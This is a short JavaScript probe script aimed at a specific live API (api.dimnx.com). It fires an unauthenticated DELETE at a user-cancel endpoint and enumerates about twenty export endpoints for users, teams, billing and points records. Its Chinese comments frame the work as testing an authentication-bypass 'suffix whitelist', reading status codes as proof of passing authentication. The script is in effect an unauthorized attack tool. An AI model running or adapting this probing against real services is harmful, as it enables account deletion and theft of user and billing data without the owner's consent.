const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36';
const BASE='https://api.dimnx.com/api';
const H={'User-Agent':UA,'Accept':'application/json','Content-Type':'application/json'};
async function call(method,p,body){
  try{
    const r=await fetch(BASE+p,{method,headers:H,body:body===undefined?undefined:JSON.stringify(body),redirect:'manual',signal:AbortSignal.timeout(12000)});
    const t=await r.text(); let j=null; try{j=JSON.parse(t);}catch{}
    return r.status+' '+(j?JSON.stringify({code:j.code,msg:(j.msg||'').slice(0,60)}):t.slice(0,60));
  }catch(e){return 'ERR '+e.name;}
}
console.log('=== DELETE /users/cancel 无鉴权 ===');
console.log('  ', await call('DELETE','/users/cancel'));
console.log('\n=== /**/export 后缀白名单验证（404=不存在, 401=要鉴权, 其它=过了鉴权）===');
const cands=['/users/export','/team/members/export','/api/team/members/export','/scripts/export','/creations/export','/tasks/export','/vip/order/export','/notice/export','/article/export','/system/role/export','/system/dept/export','/point/package/export','/billing/points/export','/dashboard/points/overview/export','/characters/export','/styles/export','/assets/export','/api/tag/export','/users/me/export','/tenant/export'];
for(const p of cands) console.log('  '+p.padEnd(38), await call('POST',p,{}));
console.log('\n=== 5 个 export 带参数 ===');
for(const p of ['/dashboard/points/records/export','/dashboard/points/consumptions/export']){
  for(const q of ['','?startTime=2026-01-01&endTime=2026-12-31','?pageNum=1&pageSize=10']){
    console.log('  '+(p+q).padEnd(70), await call('POST',p+q,{startTime:'2026-01-01',endTime:'2026-12-31',pageNum:1,pageSize:10}));
  }
}
console.log('\n=== GET 这些 export（带 query）===');
for(const p of ['/dashboard/points/records/export?startTime=2026-01-01&endTime=2026-12-31']) console.log('  '+p, await call('GET',p));
